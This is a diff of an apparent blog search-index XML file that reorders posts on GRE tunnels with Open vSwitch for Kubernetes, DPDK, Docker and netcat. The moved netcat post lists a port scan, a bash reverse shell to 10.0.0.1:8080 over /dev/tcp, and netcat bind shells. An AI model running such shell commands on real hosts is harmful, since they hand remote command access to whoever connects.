@@ -2162,16 +2162,6 @@ gear link -n "127.0.0.1:3306:10.16.138.101:49153" server/application_container_1
     </entry>
     
     <entry>
-      <title><![CDATA[Setting up GRE for Kubernetes]]></title>
-      <url>http://feisky.xyz/2015/03/01/setting-up-gre-for-kubernetes/</url>
-      <content type="html"><![CDATA[<p>首先修改Docker的默认网桥：</p>
-<figure class="highlight vala"><table><tr><td class="code"><pre><div class="line"><span class="meta">#停止Docker Daemon进程</span></div><div class="line">systemctl stop docker</div><div class="line"></div><div class="line"><span class="meta">#设置默认网桥docker0为down，并删除</span></div><div class="line">ip link <span class="keyword">set</span> dev docker0 down</div><div class="line">brctl delbr docker0</div><div class="line"></div><div class="line"><span class="meta">#新建Linux网桥localbr0</span></div><div class="line">brctl addbr localbr0</div><div class="line"></div><div class="line"><span class="meta">#在每台主机上更改10.10.x.0/24，注意各台主机之间不要重复</span></div><div class="line">ip addr add <span class="number">10.10</span><span class="number">.2</span><span class="number">.1</span>/<span class="number">24</span> dev localbr0</div><div class="line">ip link <span class="keyword">set</span> dev localbr0 up</div><div class="line"></div><div class="line">echo <span class="string">'OPTIONS="--bridge localbr0 --iptables=false"'</span>&gt;&gt;/etc/sysconfig/docker</div><div class="line">systemctl start Docker</div></pre></td></tr></table></figure>
-<p>为上述网桥添加GRE连接</p>
-<figure class="highlight smali"><table><tr><td class="code"><pre><div class="line"><span class="comment">#新建Openvswitch网桥</span></div><div class="line">ovs-vsctl<span class="built_in"> add-br </span>ovsbr</div><div class="line"></div><div class="line"><span class="comment">#启用STP协议防止网桥环路</span></div><div class="line">ovs-vsctl set<span class="keyword"> bridge</span> ovsbr stp_enable=true</div><div class="line"></div><div class="line"><span class="comment">#添加ovsbr到本地localbr0，使得容器流量通过OVS流经GRE Tunnel</span></div><div class="line">brctl addif localbr0 ovsbr</div><div class="line">ip link set dev ovsbr up</div><div class="line"></div><div class="line"><span class="comment">#创建GRE</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr tep0 -- set interface tep0 type=internal</div><div class="line"></div><div class="line"><span class="comment">#需在每个主机上修改tep0 IP地址</span></div><div class="line">ip addr<span class="built_in"> add </span>192.168.1.1/24 dev tep0</div><div class="line">ip addr<span class="built_in"> add </span>192.168.1.2/24 dev tep0</div><div class="line">ip link set dev tep0 up</div><div class="line"></div><div class="line"><span class="comment">#使用GRE隧道连接每个主机上的Openvswitch网桥</span></div><div class="line"><span class="comment">#192.168.0.127</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr gre0 -- set interface gre0 type=gre options:remote_ip=192.168.0.128</div><div class="line"></div><div class="line"><span class="comment">#192.168.0.128</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr gre0 -- set interface gre0 type=gre options:remote_ip=192.168.0.127</div><div class="line"></div><div class="line"><span class="comment">#配置路由使得跨主机间容器的通信</span></div><div class="line">ip route<span class="built_in"> add </span>10.10.0.0/16 dev tep0</div><div class="line"></div><div class="line"><span class="comment">#为了使得容器访问Internet，在两台主机上配置NAT</span></div><div class="line">iptables -t nat -A POSTROUTING -s 10.10.0.0/16 -o eth0 -j MASQUERADE</div></pre></td></tr></table></figure>
-]]></content>
-    </entry>
-    
-    <entry>
       <title><![CDATA[Open vSwitch over DPDK on Ubuntu]]></title>
       <url>http://feisky.xyz/2015/03/01/open-vswitch-over-dpdk-on-ubuntu/</url>
       <content type="html"><![CDATA[<p>There are two approaches for using DPDK acceleration in DPDK. One is the openvswitch fork from intel, called dpdk-ovs the other is done directly in openvswitch with a different approach from intel. <span class="anchor" id="line-10">&lt;/span&gt;<br><span class="anchor" id="line-11"></span><span class="anchor" id="line-12"></span></span></p>
@@ -2524,6 +2514,16 @@ From the host try to ping the guest. With the virtual machine configuration desc
 
 
 <p>备注：本文转自 <a href="https://wiki.linaro.org/LNG/Engineering/OVSDPDKOnUbuntu" target="_blank" rel="external">https://wiki.linaro.org/LNG/Engineering/OVSDPDKOnUbuntu</a>。</p>
+]]></content>
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Setting up GRE for Kubernetes]]></title>
+      <url>http://feisky.xyz/2015/03/01/setting-up-gre-for-kubernetes/</url>
+      <content type="html"><![CDATA[<p>首先修改Docker的默认网桥：</p>
+<figure class="highlight vala"><table><tr><td class="code"><pre><div class="line"><span class="meta">#停止Docker Daemon进程</span></div><div class="line">systemctl stop docker</div><div class="line"></div><div class="line"><span class="meta">#设置默认网桥docker0为down，并删除</span></div><div class="line">ip link <span class="keyword">set</span> dev docker0 down</div><div class="line">brctl delbr docker0</div><div class="line"></div><div class="line"><span class="meta">#新建Linux网桥localbr0</span></div><div class="line">brctl addbr localbr0</div><div class="line"></div><div class="line"><span class="meta">#在每台主机上更改10.10.x.0/24，注意各台主机之间不要重复</span></div><div class="line">ip addr add <span class="number">10.10</span><span class="number">.2</span><span class="number">.1</span>/<span class="number">24</span> dev localbr0</div><div class="line">ip link <span class="keyword">set</span> dev localbr0 up</div><div class="line"></div><div class="line">echo <span class="string">'OPTIONS="--bridge localbr0 --iptables=false"'</span>&gt;&gt;/etc/sysconfig/docker</div><div class="line">systemctl start Docker</div></pre></td></tr></table></figure>
+<p>为上述网桥添加GRE连接</p>
+<figure class="highlight smali"><table><tr><td class="code"><pre><div class="line"><span class="comment">#新建Openvswitch网桥</span></div><div class="line">ovs-vsctl<span class="built_in"> add-br </span>ovsbr</div><div class="line"></div><div class="line"><span class="comment">#启用STP协议防止网桥环路</span></div><div class="line">ovs-vsctl set<span class="keyword"> bridge</span> ovsbr stp_enable=true</div><div class="line"></div><div class="line"><span class="comment">#添加ovsbr到本地localbr0，使得容器流量通过OVS流经GRE Tunnel</span></div><div class="line">brctl addif localbr0 ovsbr</div><div class="line">ip link set dev ovsbr up</div><div class="line"></div><div class="line"><span class="comment">#创建GRE</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr tep0 -- set interface tep0 type=internal</div><div class="line"></div><div class="line"><span class="comment">#需在每个主机上修改tep0 IP地址</span></div><div class="line">ip addr<span class="built_in"> add </span>192.168.1.1/24 dev tep0</div><div class="line">ip addr<span class="built_in"> add </span>192.168.1.2/24 dev tep0</div><div class="line">ip link set dev tep0 up</div><div class="line"></div><div class="line"><span class="comment">#使用GRE隧道连接每个主机上的Openvswitch网桥</span></div><div class="line"><span class="comment">#192.168.0.127</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr gre0 -- set interface gre0 type=gre options:remote_ip=192.168.0.128</div><div class="line"></div><div class="line"><span class="comment">#192.168.0.128</span></div><div class="line">ovs-vsctl<span class="built_in"> add-port </span>ovsbr gre0 -- set interface gre0 type=gre options:remote_ip=192.168.0.127</div><div class="line"></div><div class="line"><span class="comment">#配置路由使得跨主机间容器的通信</span></div><div class="line">ip route<span class="built_in"> add </span>10.10.0.0/16 dev tep0</div><div class="line"></div><div class="line"><span class="comment">#为了使得容器访问Internet，在两台主机上配置NAT</span></div><div class="line">iptables -t nat -A POSTROUTING -s 10.10.0.0/16 -o eth0 -j MASQUERADE</div></pre></td></tr></table></figure>
 ]]></content>
     </entry>
     
@@ -2925,7 +2925,7 @@ From the host try to ping the guest. With the virtual machine configuration desc
 </li>
 <li>docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]<ul>
 <li># 提交指定容器为镜像</li>
-<li>-a, —author=””     Author (e.g., “John Hannibal Smith <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#104;&#x61;&#x6e;&#110;&#105;&#x62;&#97;&#108;&#64;&#x61;&#45;&#x74;&#x65;&#x61;&#x6d;&#x2e;&#x63;&#111;&#109;">&#104;&#x61;&#x6e;&#110;&#105;&#x62;&#97;&#108;&#64;&#x61;&#45;&#x74;&#x65;&#x61;&#x6d;&#x2e;&#x63;&#111;&#109;</a>“)</li>
+<li>-a, —author=””     Author (e.g., “John Hannibal Smith <a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x68;&#97;&#x6e;&#110;&#x69;&#98;&#x61;&#108;&#x40;&#97;&#45;&#x74;&#x65;&#x61;&#109;&#x2e;&#x63;&#x6f;&#109;">&#x68;&#97;&#x6e;&#110;&#x69;&#98;&#x61;&#108;&#x40;&#97;&#45;&#x74;&#x65;&#x61;&#109;&#x2e;&#x63;&#x6f;&#109;</a>“)</li>
 <li>-m, —message=””    Commit message</li>
 <li>-p, —pause=true    Pause container during commit<ul>
 <li># 默认 commit 是暂停状态</li>
@@ -3419,29 +3419,6 @@ From the host try to ping the guest. With the virtual machine configuration desc
     </entry>
     
     <entry>
-      <title><![CDATA[Linux netcat examples]]></title>
-      <url>http://feisky.xyz/2015/02/11/linux-netcat-examples/</url>
-      <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
-<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
-<p>Client: nc 172.31.100.7 1567</p>
-<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
-<p>Server: nc -l 1567 &lt; file.txt </p>
-<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
-<p>Client to Server:</p>
-<p>Server: nc -l 1567 &gt; file.txt</p>
-<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
-<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
-<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
-<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
-<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
-<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
-<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
-<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
-<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
-]]></content>
-    </entry>
-    
-    <entry>
       <title><![CDATA[How to use docker compose to deploy a flask app]]></title>
       <url>http://feisky.xyz/2015/02/11/how-to-use-docker-compose-to-deploy-a-flask-app/</url>
       <content type="html"><![CDATA[<p>The flask app is very simple, you have an index page where your can write and read comments.</p>
@@ -3667,6 +3644,29 @@ ADD static/ /www/static
 <p>Now it’s time for my questions.</p>
 <p>Do I miss something ? Or maybe I could make something better ?</p>
 <p>I like to hear your experiences about how to handle Docker orchestration !</p>
+]]></content>
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Linux netcat examples]]></title>
+      <url>http://feisky.xyz/2015/02/11/linux-netcat-examples/</url>
+      <content type="html"><![CDATA[<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nc -z -v -n 172.31.100.7 21-25</p>
+<h3 id="Chat-Server"><a href="#Chat-Server" class="headerlink" title="Chat Server"></a>Chat Server</h3><p>Server: nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567</p>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>Server to Client: </p>
+<p>Server: nc -l 1567 &lt; file.txt </p>
+<p>Client: nc -n 172.31.100.7 1567 &gt; file.txt</p>
+<p>Client to Server:</p>
+<p>Server: nc -l 1567 &gt; file.txt</p>
+<p>Client: nc 172.31.100.23 1567 &lt; file.txt</p>
+<h3 id="目录传输"><a href="#目录传输" class="headerlink" title="目录传输"></a>目录传输</h3><p>Server: tar -cvf - dir_name | nc -l 1567</p>
+<p>Client: nc -n 172.31.100.7 1567 | tar -xvf -</p>
+<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>Server: cat video.avi | nc -l 1567</p>
+<p>Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -</p>
+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>nc -l -p 8080 -vvv</p>
+<p>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</p>
+<h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>nc -l 1567 -e /bin/bash -i</p>
+<p>mkfifo /tmp/tmp_fifo &amp;&amp; cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</p>
 ]]></content>
     </entry>
     
@@ -6484,7 +6484,7 @@ neutron router-create --ha=<true |="" false=""> router1
 <p><none>              <none>              e01000c7bac8        6 weeks ago         336.5 MB<br>centos              latest              b157b77b1a65        8 weeks ago         243.7 MB<br><figure class="highlight css"><table><tr><td class="code"><pre><div class="line"></div><div class="line">其中，镜像<span class="selector-tag">id</span>唯一标识了镜像，<span class="selector-tag">TAG</span>信息用来标记来自同一个仓库的不同镜像。例如<span class="selector-tag">ubuntu</span>仓库中有多个镜像，通过<span class="selector-tag">TAG</span>信息来区分发行版本，例如10<span class="selector-class">.04</span>、12<span class="selector-class">.04</span>、12<span class="selector-class">.10</span>、13<span class="selector-class">.04</span>、14<span class="selector-class">.04</span>等。创建容器时，如果不指定具体的标记，则默认使用<span class="selector-tag">latest</span>标记信息。</div><div class="line"></div><div class="line">除了从容器中下载已有镜像外，也可以根据已有镜像创建新的镜像。创建新镜像有多种方法：</div><div class="line"></div><div class="line">①修改已有镜像后<span class="selector-tag">commit</span></div></pre></td></tr></table></figure></none></none></p>
 <p>$ sudo docker run -t -i ubuntu:12.04 /bin/bash<br>root@a439b6e894bb:/# apt-get update<br>root@a439b6e894bb:/# apt-get install nginx<br>root@a439b6e894bb:/# /etc/init.d/nginx start<br>root@a439b6e894bb:/# exit<br>$ sudo docker commit -m ‘add ngnix’ -a ‘feisky’ a439b6e894bb ubuntu:nginx<br>0a693112c443ce4fb21bc57a26d67f0648b9415e052f929be7e06701f5f3ca2d<br>$ sudo docker images<br>REPOSITORY                               TAG                 IMAGE ID            CREATED             VIRTUAL SIZE<br>ubuntu                                   nginx               0a693112c443        9 seconds ago       153.1 MB<br>ubuntu                                   12.04               0a51fcc173d8        2 days ago          111 MB<br><figure class="highlight"><table><tr><td class="code"><pre><div class="line"></div><div class="line">②用dockerfile来创建镜像</div><div class="line"></div><div class="line">首先创建一个Dockerfile：</div></pre></td></tr></table></figure></p>
 <p>$ cat Dockerfile </p>
-<h1 id="yet-another-ngnix"><a href="#yet-another-ngnix" class="headerlink" title="yet another ngnix"></a>yet another ngnix</h1><p>FROM ubuntu:12.04<br>MAINTAINER feisky <a href="&#x6d;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x66;&#x65;&#x69;&#115;&#107;&#x79;&#x40;&#114;&#111;&#x6f;&#x74;">&#x66;&#x65;&#x69;&#115;&#107;&#x79;&#x40;&#114;&#111;&#x6f;&#x74;</a><br>RUN apt-get update<br>RUN apt-get -y install nginx</p>
+<h1 id="yet-another-ngnix"><a href="#yet-another-ngnix" class="headerlink" title="yet another ngnix"></a>yet another ngnix</h1><p>FROM ubuntu:12.04<br>MAINTAINER feisky <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x66;&#101;&#105;&#115;&#x6b;&#121;&#64;&#x72;&#x6f;&#111;&#116;">&#x66;&#101;&#105;&#115;&#x6b;&#121;&#64;&#x72;&#x6f;&#111;&#116;</a><br>RUN apt-get update<br>RUN apt-get -y install nginx</p>
 <h1 id="put-my-local-site-to-var-www"><a href="#put-my-local-site-to-var-www" class="headerlink" title="put my local site to /var/www"></a>put my local site to /var/www</h1><p>ADD index.html /var/www/html/</p>
 <h1 id="expose-httpd-port"><a href="#expose-httpd-port" class="headerlink" title="expose httpd port"></a>expose httpd port</h1><p>EXPOSE 80</p>
 <h1 id="the-command-to-run"><a href="#the-command-to-run" class="headerlink" title="the command to run"></a>the command to run</h1><p>CMD [“/usr/sbin/nginx”]</p>
